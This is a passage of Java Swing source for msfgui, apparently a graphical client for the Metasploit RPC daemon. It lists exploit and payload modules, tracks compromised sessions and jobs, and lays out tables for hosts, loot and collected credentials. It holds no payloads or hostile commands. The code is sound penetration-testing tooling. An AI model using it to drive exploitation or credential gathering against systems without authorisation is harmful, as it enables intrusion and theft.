/*
 * MainFrame.java
 */
package msfgui;

import java.awt.Component;
import java.awt.HeadlessException;
import javax.swing.JTable;
import org.jdesktop.application.*;
import java.awt.event.*;
import java.io.*;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Map;
import java.util.HashMap;
import java.util.TreeMap;
import java.util.ArrayList;
import java.util.List;
import javax.swing.Timer;
import javax.swing.Icon;
import javax.swing.JComponent;
import javax.swing.JDialog;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPopupMenu;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;
import javax.swing.table.DefaultTableModel;
import org.jdesktop.application.Task;
import org.jdesktop.swingworker.SwingWorker;
import org.w3c.dom.Element;

/** The application's main frame. */
public class MainFrame extends FrameView {
	public static final int MENU_SIZE_LIMIT = 30;

	public HashMap sessionPopupMap;
	public RpcConnection rpcConn;
	private SwingWorker sessionsPollTimer;
	private SessionsTable sessionsTableModel;
	private JPopupMenu jobPopupMenu, shellPopupMenu, meterpreterPopupMenu, sessionPopupMenu;
	private String clickedJob;
	public Map[] selectedSessions;
	private SearchWindow searchWin;

	public MainFrame(SingleFrameApplication app) {
		super(app);
		initComponents();
		sessionsTableModel = null;
		sessionPopupMap = new HashMap();

		//Set up action for starting RPC
		startRpcMenuItem.setAction(getContext().getActionMap(this).get("startRpc"));
		startRpcMenuItem.setMnemonic('S');
		org.jdesktop.application.ResourceMap resources = org.jdesktop.application.Application.getInstance(
				msfgui.MsfguiApp.class).getContext().getResourceMap(MainFrame.class);
		startRpcMenuItem.setText(resources.getString("startRpcMenuItem.text")); 
		
		// status bar initialization - message timeout, idle icon and busy animation, etc
		ResourceMap resourceMap = getResourceMap();
		int messageTimeout = resourceMap.getInteger("StatusBar.messageTimeout");
		messageTimer = new Timer(messageTimeout, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				statusMessageLabel.setText("");
			}
		});
		messageTimer.setRepeats(false);
		int busyAnimationRate = resourceMap.getInteger("StatusBar.busyAnimationRate");
		for (int i = 0; i < busyIcons.length; i++) 
			busyIcons[i] = resourceMap.getIcon("StatusBar.busyIcons[" + i + "]");
		busyIconTimer = new Timer(busyAnimationRate, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				busyIconIndex = (busyIconIndex + 1) % busyIcons.length;
				statusAnimationLabel.setIcon(busyIcons[busyIconIndex]);
			}
		});
		idleIcon = resourceMap.getIcon("StatusBar.idleIcon");
		statusAnimationLabel.setIcon(idleIcon);
		progressBar.setVisible(false);

		// connecting action tasks to status bar via TaskMonitor
		TaskMonitor taskMonitor = new TaskMonitor(getApplication().getContext());
		taskMonitor.addPropertyChangeListener(new java.beans.PropertyChangeListener() {
			public void propertyChange(java.beans.PropertyChangeEvent evt) {
				String propertyName = evt.getPropertyName();
				if ("started".equals(propertyName)) {
					if (!busyIconTimer.isRunning()) {
						statusAnimationLabel.setIcon(busyIcons[0]);
						busyIconIndex = 0;
						busyIconTimer.start();
					}
					progressBar.setVisible(true);
					progressBar.setIndeterminate(true);
				} else if ("done".equals(propertyName)) {
					busyIconTimer.stop();
					statusAnimationLabel.setIcon(idleIcon);
					progressBar.setVisible(false);
					progressBar.setValue(0);
				} else if ("message".equals(propertyName)) {
					String text = (String)(evt.getNewValue());
					statusMessageLabel.setText((text == null) ? "" : text);
					messageTimer.restart();
				} else if ("progress".equals(propertyName)) {
					int value = (Integer)(evt.getNewValue());
					progressBar.setVisible(true);
					progressBar.setIndeterminate(false);
					progressBar.setValue(value);
				}
			}
		});
		//Set up GUI, RPC connection, and recent modules
		setupSessionsPollTimer();
		setupPopupMenus();
		setLnF(false);
		MsfguiApp.fileChooser = new JFileChooser();
		connectRpc();
		getFrame().addWindowListener(new WindowAdapter() {
			public void windowClosing(WindowEvent we) {
				confirmStop();
			}
		});
		//Setup icon
		this.getFrame().setIconImage( resourceMap.getImageIcon("main.icon").getImage());
		//Disable tabs by default
		for(int i = 2; i < tabbedPane.getTabCount(); i++)
			tabbedPane.setEnabledAt(i, false);
	}
	/** Before exit, check whether the daemon should be stopped or just the session terminated */
	private void confirmStop() {
		try {
			if (rpcConn != null){
				if(JOptionPane.showConfirmDialog(getFrame(), "Stop msfrpcd?") == JOptionPane.YES_OPTION)
					rpcConn.execute("core.stop");
				else
					rpcConn.execute("auth.logout");
			}
		} catch (Exception ex) {
		}
	}
	/** Adds window and menu items for reopening and closing the console */
	public void registerConsole(Map res, boolean show, String initVal) {
		final InteractWindow iw = new InteractWindow(rpcConn, res, "console", initVal);
		registerConsole(res,show,iw);
	}
	/** Adds menu items for reopening and closing the console */
	public void registerConsole(Map res, boolean show, final InteractWindow iw) {
		iw.setVisible(show);
		final String id = res.get("id").toString();
		final JMenuItem openItem = new JMenuItem(id);
		existingConsoleMenu.add(openItem);
		openItem.addActionListener(new RpcAction() {
			public void action() throws Exception {
				iw.setVisible(true);
			}
		});
		final JMenuItem closeItem = new JMenuItem(id);
		this.closeConsoleMenu.add(closeItem);
		closeItem.addActionListener(new RpcAction() {
			public void action() throws Exception {
				iw.setVisible(false);
				iw.dispose();
				rpcConn.execute("console.destroy", id);
				existingConsoleMenu.remove(openItem);
				closeConsoleMenu.remove(closeItem);
			}
		});
	}

	/** Set up auto session and job refresh */
	private void setupSessionsPollTimer() throws HeadlessException {
		sessionsPollTimer = new SwingWorker(){
			@Override
			protected List doInBackground() throws Exception {
				int delay = 500;
				while(true){
					try {
						Thread.sleep(delay);
						//update sessions
						Map slist = (Map) rpcConn.execute("session.list");
						ArrayList sessionList = new ArrayList();
						for (Object sid : slist.keySet()) {
							Map session = (Map) slist.get(sid);
							session.put("id", sid);
							MsfguiLog.defaultLog.logSession(session);
							sessionList.add(slist.get(sid));
							if((session.get("type").equals("meterpreter") || session.get("type").equals("shell"))
									&& sessionPopupMap.get(session.get("uuid")) == null)
								sessionPopupMap.put(session.get("uuid"), new InteractWindow(
										rpcConn, session, session.get("type").toString()));
						}
						MsfguiLog.defaultLog.checkSessions(slist);//Alert the logger
						if (sessionsTableModel == null) {
							sessionsTableModel = new SessionsTable(sessionList);
							sessionsTable.setModel(sessionsTableModel);
						} else {
							publish(sessionList);
						}
						//Update jobs
						Map jlist = (Map) ((Map)rpcConn.execute("job.list")).get("jobs");
						TreeMap orderedJobsList = new TreeMap();
						orderedJobsList.putAll(jlist);
						int i = 0;
						String[] jobStrings = new String[jlist.size()];
						for (Object jid : orderedJobsList.keySet()) {
							jobStrings[i] = jid.toString() + " - " + orderedJobsList.get(jid).toString();
							i++;
						}
						publish((Object)jobStrings);
					} catch (MsfException xre) {
						JOptionPane.showMessageDialog(null, xre);
						delay *= 2;
					} catch (InterruptedException iex){
					}
				}
			}
			@Override
			protected void process(List lis){
				for(Object o : lis){
					if(o instanceof List){
						sessionsTableModel.updateSessions((List)o);
						TableHelper.fitColumnWidths(sessionsTableModel,sessionsTable);
						sessionsTable.updateUI();
					}else if (o instanceof String[]){
						jobsList.setListData((String[])o);
					}
				}
			}
		};
	}

   /**
	* Makes a menu tree from a list of modules, and sets action
	* listeners from the given factory.
	* @param mlist List of modules.
	* @param rootMenu Base menu to build tree off of.
	* @param factory Factory to generate handlers to do the actions.
	*/
	private void expandList(Object[] mlist, JMenu rootMenu, RunMenuFactory factory, String type) {
		if (mlist == null)
			return;
                statusAnimationLabel.setText(statusAnimationLabel.getText()+mlist.length + " "+type+" ");
                java.util.Arrays.sort(mlist);
		for (Object fullName : mlist) {
			String[] names = fullName.toString().split("/");
			JMenu currentMenu = rootMenu;
			for (int i = 0; i < names.length; i++) {
				boolean found = false;
				Component[] comps = currentMenu.getMenuComponents();

				boolean searchNext = true;
				while(!found && searchNext){ //if "More..." listed, search through more list
					searchNext = false;
					Component [] compsCopy = comps;
					for (Component menu : compsCopy) {
						if (menu.getName().equals(names[i]) && menu instanceof JMenu) {
							if (i < names.length - 1) 
								currentMenu = (JMenu) menu;
							found = true;
							break;
						}else if (menu.getName().equals("More...")){
							searchNext = true;
							comps = ((JMenu)menu).getMenuComponents();
							currentMenu = (JMenu) menu;
						}
					}
				}

				if (!found) {
					if(comps.length > MENU_SIZE_LIMIT){ //extend if necessary
						JMenu extention = new JMenu("More...");
						extention.setName("More...");
						currentMenu.add(extention);
						currentMenu = extention;
					}
					if (i < names.length - 1) {
						JMenu men = new JMenu(names[i]);
						men.setName(names[i]);
						currentMenu.add(men);
						currentMenu = (JMenu) men;
					} else {
						JMenuItem men = new JMenuItem(names[i]);
						men.setName(names[i]);
						currentMenu.add(men);
						ActionListener actor = factory.getActor(fullName.toString(),type,rpcConn);
						men.addActionListener(actor);
						searchWin.modules.add(new Object[]{type, fullName.toString(),actor});
					}
				}
			}//end for each subname
		}//end for each module
		rootMenu.setEnabled(true);
	}//end expandList()

   /** Displays info including version */
	@Action
	public void showAboutBox() {
		String version = "";
		try {
			Map results = (Map)rpcConn.execute("core.version");
			version = results.get("version").toString();
		} catch (MsfException xre) {
			JOptionPane.showMessageDialog(this.getFrame(), xre);
		} catch (NullPointerException nex) {
		}
		if (aboutBox == null)
			aboutBox = new MsfguiAboutBox(getFrame(),version);
		MsfguiApp.getApplication().show(aboutBox);
	}

   /** Makes a menu tree with expandList for exploits and auxiliary. Also start jobs/sessions watcher. */
	public void getModules() {
		searchWin = new SearchWindow(rpcConn);
		MsfguiApp.addRecentModules(rpcConn, this);
		getContext().getActionMap(this).get("moduleTask").actionPerformed(new java.awt.event.ActionEvent(this,1234,""));
	}

   /** Makes a menu tree with expandList for exploits and auxiliary. Also start jobs/sessions watcher. */
	public void refreshConsoles(){
		existingConsoleMenu.removeAll();
		closeConsoleMenu.removeAll();
		//Setup consoles
		try{
			Object[] consoles = (Object[]) ((Map)rpcConn.execute("console.list")).get("consoles");
			for (Object console : consoles)
				registerConsole((Map)console,false, "");
		}catch (MsfException mex){
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
	}

	/** helper for getModules - does the work */
	@Action
	public Task moduleTask(){
		final MainFrame me = this;
		return new Task<Void, Void>(getApplication()){
			@Override
			protected Void doInBackground() throws Exception {
				setTitle("Connected to running msfrpcd. Getting module lists.");
				setProgress(0.0f);
				//Get modules lists
				try {
					// yeah three layer deep nested inner classes sucks but I hate making new files for each one
					RunMenuFactory moduleFactory =  new RunMenuFactory(){
						public ActionListener getActor(final String modName, final String type, final RpcConnection rpcConn) {
							return new ActionListener(){
								public void actionPerformed(ActionEvent e) {
									new ModulePopup(modName,rpcConn,type, me).setVisible(true);
								}
							};
						}
					};
					//Exploits and auxiliary get modulepopups; payloads get payloadpopups duh
					setMessage("Getting exploits");
					expandList((Object[]) ((Map)rpcConn.execute("module.exploits")).get("modules"), exploitsMenu, moduleFactory, "exploit");
					setProgress(0.3f);
					setMessage("Getting auxiliary modules");
					expandList((Object[]) ((Map)rpcConn.execute("module.auxiliary")).get("modules"), auxiliaryMenu, moduleFactory, "auxiliary");
					setProgress(0.5f);
					setMessage("Getting payloads");
					expandList((Object[]) ((Map)rpcConn.execute("module.payloads")).get("modules"), payloadsMenu, new RunMenuFactory(){
						public ActionListener getActor(final String modName, final String type, final RpcConnection rpcConn) {
							return new ActionListener() {
								public void actionPerformed(ActionEvent e) {
									new PayloadPopup(modName, rpcConn, me).setVisible(true);
								}
							};
						}
					}, "payload");
					setProgress(0.8f);
					setMessage("Querying database...");
					// Enable menus
					postMenu.setEnabled(true);
					databaseMenu.setEnabled(true);
					pluginsMenu.setEnabled(true);
					consoleMenu.setEnabled(true);
					reloadDb();
					setProgress(0.95f);
					setMessage("Finding open consoles");
					refreshConsoles();
					setProgress(1.0f);
				} catch (MsfException ex) {
					statusAnimationLabel.setText("Error getting module lists. " + ex);
				}
				return null;
			}

			@Override
			protected void succeeded(Void blah) {
				sessionsPollTimer.execute();
				statusAnimationLabel.setText(statusAnimationLabel.getText()+"modules");
				setMessage("");
			}
		};
	}

	/** This method is called from within the constructor to
	 * initialize the form.
	 * WARNING: Do NOT modify this code. The content of this method is
	 * always regenerated by the Form Editor.
	 */
	@SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        mainPanel = new javax.swing.JPanel();
        tabbedPane = new javax.swing.JTabbedPane();
        jobsPane = new javax.swing.JScrollPane();
        jobsList = new javax.swing.JList();
        sessionsPane = new javax.swing.JScrollPane();
        sessionsTable = new javax.swing.JTable();
        hostsPane = new javax.swing.JScrollPane();
        hostsTable = new javax.swing.JTable();
        hostsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {},
            new String [] {
                "Created", "Address", "Address6", "MAC", "Name", "State", "OS name", "OS flavor", "OS SP", "OS lang", "Updated", "Purpose", "Info"
            }
        ) {
            Class[] types = new Class [] {
                java.lang.Object.class, java.lang.Object.class, java.lang.String.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class, java.lang.Object.class
            };
            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }
            public boolean isCellEditable(int i,int j) {
                return false;
            }
        });
        clientsPane = new javax.swing.JScrollPane();
        clientsTable = new javax.swing.JTable();
        clientsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Host", "UA String", "UA Name", "UA Ver", "Created", "Updated"
            }
        ) {
            public Class getColumnClass(int columnIndex) {
                return java.lang.String.class;
            }
            public boolean isCellEditable(int i,int j) {
                return false;
            }
        });
        servicesPane = new javax.swing.JScrollPane();
        servicesTable = new javax.swing.JTable();
        servicesTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Host", "Created", "Updated", "Port", "Proto", "State", "Name", "Info"
            }
        ) {
            public Class getColumnClass(int columnIndex) {
                return java.lang.String.class;
            }
            public boolean isCellEditable(int i,int j) {
                return false;
            }
        });
        vulnsPane = new javax.swing.JScrollPane();
        vulnsTable = new javax.swing.JTable();
        vulnsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Port", "Proto", "Time", "Host", "Name", "Refs"
            }
        ) {
            public Class getColumnClass(int columnIndex) {
                return java.lang.String.class;
            }
            public boolean isCellEditable(int i,int j) {
                return false;
            }
        });
        eventsPane = new javax.swing.JScrollPane();
        eventsTable = new javax.swing.JTable();
        eventsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Host", "Created", "Updated", "Name", "Critical", "Username", "Info"
            }
        ) {
            public Class getColumnClass(int columnIndex) {
                return java.lang.String.class;
            }
            public boolean isCellEditable(int i,int j) {
                return false;
            }
        });
        notesPane = new javax.swing.JScrollPane();
        notesTable = new javax.swing.JTable();
        notesTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] { },
            new String [] {
                "Time", "Host", "Service", "Type", "Data"
            }
        ) {
            public boolean isCellEditable(int i,int j) {
                return false;
            }
        });
        lootsPane = new javax.swing.JScrollPane();
        lootsTable = new javax.swing.JTable();
        menuBar = new javax.swing.JMenuBar();
        javax.swing.JMenu fileMenu = new javax.swing.JMenu();
        connectRpcMenuItem = new javax.swing.JMenuItem();
        startRpcMenuItem = new javax.swing.JMenuItem();
        showDetailsItem = new javax.swing.JMenuItem();
        jSeparator1 = new javax.swing.JPopupMenu.Separator();
        searchItem = new javax.swing.JMenuItem();
        changeLFMenuItem = new javax.swing.JMenuItem();
        javax.swing.JMenuItem exitMenuItem = new javax.swing.JMenuItem();
        exploitsMenu = new javax.swing.JMenu();
        auxiliaryMenu = new javax.swing.JMenu();
        payloadsMenu = new javax.swing.JMenu();
        historyMenu = new javax.swing.JMenu();
        recentMenu = new javax.swing.JMenu();
        clearHistoryItem = new javax.swing.JMenuItem();
        postMenu = new javax.swing.JMenu();
        menuRunAllMeterp = new javax.swing.JMenu();
        killSessionsMenuItem = new javax.swing.JMenuItem();
        collectedCredsMenuItem = new javax.swing.JMenuItem();
        logGenerateMenuItem = new javax.swing.JMenuItem();
        consoleMenu = new javax.swing.JMenu();
        newConsoleItem = new javax.swing.JMenuItem();
        existingConsoleMenu = new javax.swing.JMenu();
        closeConsoleMenu = new javax.swing.JMenu();
        refreshConsolesItem = new javax.swing.JMenuItem();
        databaseMenu = new javax.swing.JMenu();
        connectItem = new javax.swing.JMenuItem();
        disconnectItem = new javax.swing.JMenuItem();
        refreshItem = new javax.swing.JMenuItem();
        importItem = new javax.swing.JMenuItem();
        currWorkspaceItem = new javax.swing.JMenuItem();
        addWorkspaceItem = new javax.swing.JMenuItem();
        delWorkspaceItem = new javax.swing.JMenuItem();
        pluginsMenu = new javax.swing.JMenu();
        autoAddRouteItem = new javax.swing.JMenuItem();
        soundItem = new javax.swing.JMenuItem();
        dbCredcollectItem = new javax.swing.JMenuItem();
        dbTrackerItem = new javax.swing.JMenuItem();
        socketLoggerItem = new javax.swing.JMenuItem();
        ipsFilterItem = new javax.swing.JMenuItem();
        otherPluginItem = new javax.swing.JMenuItem();
        unloadPluginItem = new javax.swing.JMenuItem();
        helpMenu = new javax.swing.JMenu();
        onlineHelpMenu = new javax.swing.JMenuItem();
        javax.swing.JMenuItem aboutMenuItem = new javax.swing.JMenuItem();
        statusPanel = new javax.swing.JPanel();
        statusMessageLabel = new javax.swing.JLabel();
        statusAnimationLabel = new javax.swing.JLabel();
        progressBar = new javax.swing.JProgressBar();

        mainPanel.setName("mainPanel"); // NOI18N

        tabbedPane.setName("tabbedPane"); // NOI18N

        jobsPane.setName("jobsPane"); // NOI18N
        jobsPane.setPreferredSize(new java.awt.Dimension(10, 10));

        jobsList.setName("jobsList"); // NOI18N
        jobsPane.setViewportView(jobsList);

        org.jdesktop.application.ResourceMap resourceMap = org.jdesktop.application.Application.getInstance(msfgui.MsfguiApp.class).getContext().getResourceMap(MainFrame.class);
        tabbedPane.addTab(resourceMap.getString("jobsPane.TabConstraints.tabTitle"), jobsPane); // NOI18N

        sessionsPane.setName("sessionsPane"); // NOI18N

        sessionsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {

            }
        ));
        sessionsTable.setName("sessionsTable"); // NOI18N
        sessionsTable.setSelectionMode(javax.swing.ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        sessionsPane.setViewportView(sessionsTable);

        tabbedPane.addTab(resourceMap.getString("sessionsPane.TabConstraints.tabTitle"), sessionsPane); // NOI18N

        hostsPane.setName("hostsPane"); // NOI18N

        hostsTable.setName("hostsTable"); // NOI18N
        hostsTable.setShowHorizontalLines(false);
        hostsTable.setShowVerticalLines(false);
        hostsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                hostsTableKeyReleased(evt);
            }
        });
        hostsPane.setViewportView(hostsTable);
        hostsTable.getColumnModel().getColumn(0).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title0")); // NOI18N
        hostsTable.getColumnModel().getColumn(1).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title1")); // NOI18N
        hostsTable.getColumnModel().getColumn(2).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title2")); // NOI18N
        hostsTable.getColumnModel().getColumn(3).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title3")); // NOI18N
        hostsTable.getColumnModel().getColumn(4).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title4")); // NOI18N
        hostsTable.getColumnModel().getColumn(5).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title5")); // NOI18N
        hostsTable.getColumnModel().getColumn(6).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title6")); // NOI18N
        hostsTable.getColumnModel().getColumn(7).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title7")); // NOI18N
        hostsTable.getColumnModel().getColumn(8).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title8")); // NOI18N
        hostsTable.getColumnModel().getColumn(9).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title9")); // NOI18N
        hostsTable.getColumnModel().getColumn(10).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title10")); // NOI18N
        hostsTable.getColumnModel().getColumn(11).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title11")); // NOI18N
        hostsTable.getColumnModel().getColumn(12).setHeaderValue(resourceMap.getString("hostsTable.columnModel.title12")); // NOI18N

        tabbedPane.addTab(resourceMap.getString("hostsPane.TabConstraints.tabTitle"), hostsPane); // NOI18N

        clientsPane.setName("clientsPane"); // NOI18N

        clientsTable.setName("clientsTable"); // NOI18N
        clientsTable.setShowHorizontalLines(false);
        clientsTable.setShowVerticalLines(false);
        clientsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                clientsTableKeyReleased(evt);
            }
        });
        clientsPane.setViewportView(clientsTable);

        tabbedPane.addTab(resourceMap.getString("clientsPane.TabConstraints.tabTitle"), clientsPane); // NOI18N

        servicesPane.setName("servicesPane"); // NOI18N

        servicesTable.setName("servicesTable"); // NOI18N
        servicesTable.setShowHorizontalLines(false);
        servicesTable.setShowVerticalLines(false);
        servicesTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                servicesTableKeyReleased(evt);
            }
        });
        servicesPane.setViewportView(servicesTable);

        tabbedPane.addTab(resourceMap.getString("servicesPane.TabConstraints.tabTitle"), servicesPane); // NOI18N

        vulnsPane.setName("vulnsPane"); // NOI18N

        vulnsTable.setName("vulnsTable"); // NOI18N
        vulnsTable.setShowHorizontalLines(false);
        vulnsTable.setShowVerticalLines(false);
        vulnsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                vulnsTableKeyReleased(evt);
            }
        });
        vulnsPane.setViewportView(vulnsTable);

        tabbedPane.addTab(resourceMap.getString("vulnsPane.TabConstraints.tabTitle"), vulnsPane); // NOI18N

        eventsPane.setName("eventsPane"); // NOI18N

        eventsTable.setName("eventsTable"); // NOI18N
        eventsTable.setShowHorizontalLines(false);
        eventsTable.setShowVerticalLines(false);
        eventsPane.setViewportView(eventsTable);

        tabbedPane.addTab(resourceMap.getString("eventsPane.TabConstraints.tabTitle"), eventsPane); // NOI18N

        notesPane.setName("notesPane"); // NOI18N

        notesTable.setName("notesTable"); // NOI18N
        notesTable.setShowHorizontalLines(false);
        notesTable.setShowVerticalLines(false);
        notesTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                notesTableKeyReleased(evt);
            }
        });
        notesPane.setViewportView(notesTable);

        tabbedPane.addTab(resourceMap.getString("notesPane.TabConstraints.tabTitle"), notesPane); // NOI18N

        lootsPane.setName("lootsPane"); // NOI18N

        lootsTable.setName("lootsTable"); // NOI18N
        lootsTable.setShowHorizontalLines(false);
        lootsTable.setShowVerticalLines(false);
        lootsTable.setModel(new javax.swing.table.DefaultTableModel(
            new Object [][] {

            },
            new String [] {
                "Host", "Service", "Ltype", "Ctype", "Data", "Created", "Updated", "Name", "Info"
            }
        ) {
            public Class getColumnClass(int columnIndex) {
                return java.lang.String.class;
            }
            public boolean isCellEditable(int i,int j) {
                return false;
            }
        });
        lootsTable.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyReleased(java.awt.event.KeyEvent evt) {
                lootsTableKeyReleased(evt);
            }
        });
        lootsPane.setViewportView(lootsTable);

        tabbedPane.addTab(resourceMap.getString("lootsPane.TabConstraints.tabTitle"), lootsPane); // NOI18N

        javax.swing.GroupLayout mainPanelLayout = new javax.swing.GroupLayout(mainPanel);
        mainPanel.setLayout(mainPanelLayout);
        mainPanelLayout.setHorizontalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(tabbedPane, javax.swing.GroupLayout.DEFAULT_SIZE, 882, Short.MAX_VALUE)
        );
        mainPanelLayout.setVerticalGroup(
            mainPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(tabbedPane, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 532, Short.MAX_VALUE)
        );

        menuBar.setName("menuBar"); // NOI18N

        fileMenu.setMnemonic('F');
        fileMenu.setText(resourceMap.getString("fileMenu.text")); // NOI18N
        fileMenu.setName("fileMenu"); // NOI18N

        connectRpcMenuItem.setMnemonic('C');
        connectRpcMenuItem.setText(resourceMap.getString("connectRpcMenuItem.text")); // NOI18N
        connectRpcMenuItem.setName("connectRpcMenuItem"); // NOI18N
        connectRpcMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                connectRpcMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(connectRpcMenuItem);

        startRpcMenuItem.setMnemonic('S');
        startRpcMenuItem.setText(resourceMap.getString("startRpcMenuItem.text")); // NOI18N
        startRpcMenuItem.setName("startRpcMenuItem"); // NOI18N
        fileMenu.add(startRpcMenuItem);

        showDetailsItem.setMnemonic('d');
        showDetailsItem.setText(resourceMap.getString("showDetailsItem.text")); // NOI18N
        showDetailsItem.setName("showDetailsItem"); // NOI18N
        showDetailsItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                showDetailsItemActionPerformed(evt);
            }
        });
        fileMenu.add(showDetailsItem);

        jSeparator1.setName("jSeparator1"); // NOI18N
        fileMenu.add(jSeparator1);

        searchItem.setText(resourceMap.getString("searchItem.text")); // NOI18N
        searchItem.setName("searchItem"); // NOI18N
        searchItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                searchItemActionPerformed(evt);
            }
        });
        fileMenu.add(searchItem);

        changeLFMenuItem.setMnemonic('L');
        changeLFMenuItem.setText(resourceMap.getString("changeLFMenuItem.text")); // NOI18N
        changeLFMenuItem.setName("changeLFMenuItem"); // NOI18N
        changeLFMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                changeLFMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(changeLFMenuItem);

        javax.swing.ActionMap actionMap = org.jdesktop.application.Application.getInstance(msfgui.MsfguiApp.class).getContext().getActionMap(MainFrame.class, this);
        exitMenuItem.setAction(actionMap.get("quit")); // NOI18N
        exitMenuItem.setName("exitMenuItem"); // NOI18N
        exitMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                exitMenuItemActionPerformed(evt);
            }
        });
        fileMenu.add(exitMenuItem);

        menuBar.add(fileMenu);

        exploitsMenu.setMnemonic('E');
        exploitsMenu.setText(resourceMap.getString("exploitsMenu.text")); // NOI18N
        exploitsMenu.setEnabled(false);
        exploitsMenu.setName("exploitsMenu"); // NOI18N
        menuBar.add(exploitsMenu);

        auxiliaryMenu.setMnemonic('A');
        auxiliaryMenu.setText(resourceMap.getString("auxiliaryMenu.text")); // NOI18N
        auxiliaryMenu.setName("auxiliaryMenu"); // NOI18N
        auxiliaryMenu.setEnabled(false);
        menuBar.add(auxiliaryMenu);

        payloadsMenu.setMnemonic('P');
        payloadsMenu.setText(resourceMap.getString("payloadsMenu.text")); // NOI18N
        payloadsMenu.setEnabled(false);
        payloadsMenu.setName("payloadsMenu"); // NOI18N
        menuBar.add(payloadsMenu);

        historyMenu.setMnemonic('H');
        historyMenu.setText(resourceMap.getString("historyMenu.text")); // NOI18N
        historyMenu.setName("historyMenu"); // NOI18N

        recentMenu.setMnemonic('R');
        recentMenu.setText(resourceMap.getString("recentMenu.text")); // NOI18N
        recentMenu.setEnabled(false);
        recentMenu.setName("recentMenu"); // NOI18N
        historyMenu.add(recentMenu);

        clearHistoryItem.setMnemonic('H');
        clearHistoryItem.setText(resourceMap.getString("clearHistoryItem.text")); // NOI18N
        clearHistoryItem.setName("clearHistoryItem"); // NOI18N
        clearHistoryItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                clearHistoryItemActionPerformed(evt);
            }
        });
        historyMenu.add(clearHistoryItem);

        menuBar.add(historyMenu);

        postMenu.setMnemonic('t');
        postMenu.setText(resourceMap.getString("postMenu.text")); // NOI18N
        postMenu.setEnabled(false);
        postMenu.setName("postMenu"); // NOI18N

        menuRunAllMeterp.setMnemonic('R');
        menuRunAllMeterp.setText(resourceMap.getString("menuRunAllMeterp.text")); // NOI18N
        menuRunAllMeterp.setName("menuRunAllMeterp"); // NOI18N
        postMenu.add(menuRunAllMeterp);

        killSessionsMenuItem.setMnemonic('K');
        killSessionsMenuItem.setText(resourceMap.getString("killSessionsMenuItem.text")); // NOI18N
        killSessionsMenuItem.setName("killSessionsMenuItem"); // NOI18N
        killSessionsMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                killSessionsMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(killSessionsMenuItem);

        collectedCredsMenuItem.setMnemonic('S');
        collectedCredsMenuItem.setText(resourceMap.getString("collectedCredsMenuItem.text")); // NOI18N
        collectedCredsMenuItem.setName("collectedCredsMenuItem"); // NOI18N
        collectedCredsMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                collectedCredsMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(collectedCredsMenuItem);

        logGenerateMenuItem.setMnemonic('G');
        logGenerateMenuItem.setText(resourceMap.getString("logGenerateMenuItem.text")); // NOI18N
